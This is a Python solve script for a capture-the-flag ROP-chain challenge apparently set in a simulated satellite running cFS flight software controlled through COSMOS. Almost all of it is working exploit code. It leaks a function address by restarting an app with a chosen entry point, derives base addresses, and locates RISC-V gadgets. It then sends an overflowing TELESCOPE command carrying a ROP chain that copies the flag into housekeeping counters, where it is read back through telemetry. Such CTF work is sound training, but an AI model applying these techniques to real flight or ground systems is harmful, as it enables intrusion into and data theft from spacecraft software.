#!/usr/bin/env python3

# Solve challenge 3: rop chain challenge.

import os
import itertools
import struct

try:
    from pwn import *
except ModuleNotFoundError as e:
    print("You don't have pwntools installed.")
    print("Please install with 'pip3 install pwntools.'")
    exit(-1)

context.log_level = "error"

FSW_PATH="./fsw/cpu1"
CORE_BINARY_PATH=f"{FSW_PATH}/core-cpu1"
CHAL_BINARY_PATH=f"{FSW_PATH}/cf/telescope.so"

os.environ["COSMOS_VERSION"] = "1.1.1"
#os.environ["COSMOS_API_USER"] = "a"
os.environ["COSMOS_API_PASSWORD"] = "a"
os.environ["COSMOS_LOG_LEVEL"] = "DEBUG"
os.environ["COSMOS_API_SCHEMA"] = "http"
os.environ["COSMOS_API_HOSTNAME"] = "cosmos-cmd-tlm-api"
os.environ["COSMOS_API_PORT"] = "2901"

from cosmosc2 import * 

FLAG_SIZE = 14

def ccmd(c):
    cmd(None, c)

def create_func_skel(func_name, func_line, instr_bytes):
    return {"fn_name": func_name, "line": func_line, "bytes": instr_bytes}

def create_local_skel(offset):
    return {"offset": offset}

def get_gadget_addresses(elf, gadgets, base_address):
    for gadget in gadgets.values():
        pwn_func = elf.functions.get(gadget["fn_name"])

        # Disassemble 100 instructions at the address specified
        d = elf.disasm(pwn_func.address, pwn_func.size).splitlines()

        for instruction in d:
            if gadget["bytes"] in instruction:
                gadget["address"] = int(instruction.split(":")[0].strip(), 16) + base_address

    for gadget_name, gadget in gadgets.items():
        print(f"{gadget_name} : {hex(gadget['address'])}")

def get_entry_point(app_name):
    print(f"Getting start address of {app_name}")

    es_send_app_info_cmd_skel = "CFE_ES SEND_APP_INFO with CCSDS_STREAMID 6150, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 21, CCSDS_FUNCCODE 8, CCSDS_CHECKSUM 0, APP_NAME %s"
    
    cur_recv_cnt = tlm("CFE_ES APP_INFO_TLM_PKT RECEIVED_COUNT")
    if cur_recv_cnt is None:
        cur_recv_cnt = 0
    
    while True:
        try:
            cur_recv_cnt = tlm("CFE_ES APP_INFO_TLM_PKT RECEIVED_COUNT")
            if cur_recv_cnt is None:
                cur_recv_cnt = 0
            print(cur_recv_cnt)
            ccmd(es_send_app_info_cmd_skel % app_name)
            wait_check(f"CFE_ES APP_INFO_TLM_PKT RECEIVED_COUNT > {cur_recv_cnt}", 10)
            if tlm("CFE_ES APP_INFO_TLM_PKT NAME") != app_name:
                print("Packet recieved for app info doesn't match the app name requested. Bailing out...")
                exit()
            break
        except cosmosc2.exceptions.CosmosCheckError:
            continue

    start_addr = tlm("CFE_ES APP_INFO_TLM_PKT START_ADDR")
    
    print(f"Got start address of {app_name}: {start_addr}")
    return start_addr

# Assumes the .so name is the lowercase version of the app name
def get_func_leak(app_to_stop, func_to_leak):
    cur_recv_cnt = tlm("CFE_ES APP_INFO_TLM_PKT RECEIVED_COUNT")

    print(f"Leaking function address through app: {app_to_stop}")

    stop_app_cmd_skel = "CFE_ES STOP_APP with CCSDS_STREAMID 6150, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 21, CCSDS_FUNCCODE 5, CCSDS_CHECKSUM 0, APP_NAME %s"
    start_app_cmd_skel = "CFE_ES START_APP with CCSDS_STREAMID 6150, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 113, CCSDS_FUNCCODE 4, CCSDS_CHECKSUM 0, APP_NAME %s, APP_ENTRY_POINT %s, APP_FILENAME /cf/%s.so, STACK_SIZE 8192, EXCEPTION_ACTION 0, PRIORITY 0"

    ccmd(stop_app_cmd_skel % app_to_stop)

    wait(5)

    ccmd(start_app_cmd_skel % (app_to_stop, func_to_leak, app_to_stop.lower()))

    wait(2)

    return get_entry_point(app_to_stop)

def point_gs(station, az, el, channel, constellation, sps, fec_repeat, accesscode):
    # Select ground station
    ccmd('GS SELECT_STATION with OPCODE 1, STATION_NAME '+station)

    # Request access
    ccmd(f"GS ACCESS_REQUEST with OPCODE 2, STATION_NAME {station}, PAYLOAD Optional")
    wait_check("GS ACCESS_STATUS ACCESS == \"GRANTED\"", 5)

    # Configure TX/RX
    ccmd(f'GS SET_STATION_RX_CONFIG with OPCODE 5, CHANNEL {channel}, CONSTELLATION {constellation}, SAMPLE_PER_SYMBOL {sps}, FEC_REPEAT {fec_repeat}, ACCESS_BYTES {accesscode}')
    ccmd(f'GS SET_STATION_TX_CONFIG with OPCODE 4, CHANNEL {channel}, CONSTELLATION {constellation}, SAMPLE_PER_SYMBOL {sps}, FEC_REPEAT {fec_repeat}, ACCESS_BYTES {accesscode}')

    # Steer antenna
    ccmd(f'GS STEER_ANTENNA with OPCODE 3, AZIMUTH {az}, ELEVATION {el}')

def enable_telemetry(address):
    ccmd(f"KIT_TO ENABLE_TELEMETRY with CCSDS_STREAMID 6272, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 17, CCSDS_FUNCCODE 5, CCSDS_CHECKSUM 0, IP_ADDR {address}")

# converts num to 4 uints of size 1
def pp32(num):
    return struct.unpack("4B", p32(num))

def solve(core_gadgets, local_addresses):
    rop_cmd_skel = "TELESCOPE MULTIPLE_MISSION_REQ with CCSDS_STREAMID 6545, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 54, CCSDS_FUNCCODE 0x69, CCSDS_CHECKSUM 0, NUM_MISSIONS 26, MISSIONS_TO_REQUEST %s"

    def nothing(letter, num):
        return [ord(letter)] * num

    # cfs_memcpy 
    def cfs_memcpy(dst, src, n):
        nonlocal core_gadgets, local_addresses, rop_cmd_skel

        rop_arr = [
            nothing("A", 7),
            pp32(local_addresses["stack_frame_ptr"]["address"]),
            pp32(core_gadgets["memcpy_addr"]["address"]),
            pp32(n),
            pp32(src),
            pp32(dst),
            nothing("B", 11),
            pp32(core_gadgets["stackalignment_addr_44"]["address"]),
            nothing("C", 1),
            pp32(core_gadgets["stackalignment_addr_60"]["address"]),
            nothing("D", 5)
        ]

        rop_arr = list(itertools.chain.from_iterable(rop_arr))

        print(rop_arr)

        return rop_cmd_skel % rop_arr

    flag = bytearray()
    for byte_idx in range(0, FLAG_SIZE, 4):
        rop_cmd = cfs_memcpy(local_addresses["dst"]["address"], local_addresses["src"]["address"] + byte_idx, 0x4)

        ccmd(rop_cmd)

        # Wait until we increment a single HK_TLM Packet
        ra_tlm_rc = tlm("TELESCOPE HOUSEKEEPING RECEIVED_COUNT")
        wait(1)
        
        ccmd("TELESCOPE MULTIPLE_MISSION_REQ with CCSDS_STREAMID 6545, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 54, CCSDS_FUNCCODE 0x69, CCSDS_CHECKSUM 0, NUM_MISSIONS 1, MISSIONS_TO_REQUEST [0]")
        wait(10)
        
        wait_check(f"TELESCOPE HOUSEKEEPING RECEIVED_COUNT > {ra_tlm_rc}", 10)
        
        flag_c = (tlm("TELESCOPE HOUSEKEEPING MSG_INVALID_COUNT") | tlm("TELESCOPE HOUSEKEEPING CMD_INVALID_COUNT") << 16)
        
        flag += struct.unpack("4s", p32(flag_c))[0]

        print(f"flag: {flag}")
        print(f"flag_c: {flag_c}")

    print(f"final flag: {flag}")

def get_local_addresses(app_base, local_addresses):
    for var in local_addresses:
        local_addresses[var]["address"] = app_base + local_addresses[var]["offset"]
        print(f"{var}: {hex(local_addresses[var]['address'])}")
    return

def main():
    if not (os.path.exists("./fsw/cpu1")):
        print("Cant find FSW. Please add fsw/cpu1 folder.")
        exit(-1)

    point_gs(station="Kathmandu",
             az=180.0,
             el=70.0,
             channel=0,
             constellation="BPSK",
             sps=12,
             fec_repeat=4,
             accesscode="0x0000")

    wait(2)

    enable_telemetry("192.168.3.1")

    wait(5)

    context.log_level = "error"

    core_elf = ELF(CORE_BINARY_PATH)
    chal_elf = ELF(CHAL_BINARY_PATH)

    # Also requires riscv toolchain to be in $PATH
    core_elf.arch, chal_elf.arch = ["riscv"] * 2 # Needs a lil nudge to understand its riscv

    # These are function addresses we need to find in core-cpu1
    core_func_gadgets = {
        "stackalignment_addr_44": create_func_skel("CFE_TIME_SetLeapSeconds", 44, "50b2"),
        "stackalignment_addr_60": create_func_skel("CFE_ES_FormCDSName", 68, "50f2"),
        "memcpy_addr"           : create_func_skel("CFE_PSP_MemCpy", 20, "fe442603")
    }

    # These are addresses that are local to the .so and to the stack
    local_addresses = {
        "stack_frame_ptr"       : create_local_skel(0x1288c),
        "hkpkt_invalid_cmd_cnt" : create_local_skel(0x12d1c),
        "telescope_flag"        : create_local_skel(0x2e5b8)
    }

    func_to_leak = "CFE_PSP_MemCpy"

    cfe_psp_memcpy_addr = get_func_leak("PUZZLEBOX", func_to_leak)
    
    core_base_addr = cfe_psp_memcpy_addr - core_elf.functions.get(func_to_leak).address

    get_gadget_addresses(core_elf, core_func_gadgets, core_base_addr)
    
    core_func_gadgets["stackalignment_addr_60"]["address"] -= 0x4
    
    get_local_addresses((get_entry_point("TELESCOPE") & 0xFFFFF000) - 0xf000 - 0x14000, local_addresses)

    local_addresses["src"] = local_addresses["telescope_flag"]
    local_addresses["dst"] = local_addresses["hkpkt_invalid_cmd_cnt"]

    solve(core_func_gadgets, local_addresses)

if __name__ == "__main__":
    if not os.path.isdir("/opt/riscv32-buildroot-linux-gnu_sdk-buildroot/"):
        print("Looks like you don't have the riscv toolchain installed.")

        exit(-1)

    main()
